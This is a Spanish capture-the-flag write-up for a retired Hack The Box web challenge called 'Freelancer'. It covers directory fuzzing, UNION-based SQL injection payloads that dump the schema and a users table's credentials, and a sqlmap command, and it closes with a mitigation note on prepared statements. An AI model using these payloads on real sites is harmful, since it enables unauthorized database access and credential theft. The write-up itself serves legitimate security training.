---
challenge: Freelancer
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, sqli, union, mysql, admin-panel]
---

# Freelancer — Hack The Box

[⚑ English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

El punto de entrada **no es el login**: es `portfolio.php?id=1`, un parámetro `GET` concatenado en la consulta (MySQL). Con `UNION` de **tres columnas** se vuelca el esquema y se obtiene la credencial del administrador; el panel `/admin` aparece al hacer fuzzing de directorios y con ella se llega a la flag.

## Enunciado y superficie

Instancia Docker con una web de freelancers: portada, portfolios por `id` y un formulario de login. Sin código fuente; el análisis es de caja negra.

## Reconocimiento

```bash
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
# portfolio.php, /admin
curl -s "http://<IP>/portfolio.php?id=1"
```

## Explicación del fallo

Una comilla en `id` rompe la consulta (`id=1'` devuelve el portfolio vacío o el texto lorem desaparece): inyección clásica en un `SELECT` con **tres columnas**.

```text
id=1' ORDER BY 3-- -
id=1' UNION SELECT 1,2,3-- -
id=-1' UNION SELECT 1,version(),database()-- -
```

```text
5.7.x | <base_de_datos>
```

## Explotación

Se enumera el esquema y se extrae la tabla de usuarios:

```text
id=-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
id=-1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='<tabla>'-- -
id=-1' UNION SELECT 1,concat(username,0x3a,password),3 FROM <tabla>-- -
```

La versión del reto es antigua y la contraseña se guarda en claro o con un hash trivial, así que se entra en `/admin` con lo obtenido. Automatizado:

```bash
sqlmap -u "http://<IP>/portfolio.php?id=1" --batch --dbs --privileges
```

Los writeups públicos discrepan en el último paso: unos leen la flag directamente en el volcado de la base de datos y otros la recogen del panel `/admin` tras autenticarse. Ambas rutas salen del mismo `UNION`.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Mirar el HTML antes del login**: el `href="portfolio.php?id=1"` es la pista que ahorra media hora.
- **Columnas**: `ORDER BY` primero, `UNION SELECT 1,2,3` después.
- **`-1` en el `id`**: sin él la fila legítima tapa el resultado de la inyección.

- Un parámetro `GET` numérico es el sospechoso número uno de cualquier reto web.
- `UNION` convierte cualquier columna reflejada en un canal de extracción.
- Mitigación: consultas preparadas y permisos mínimos para la cuenta de base de datos.
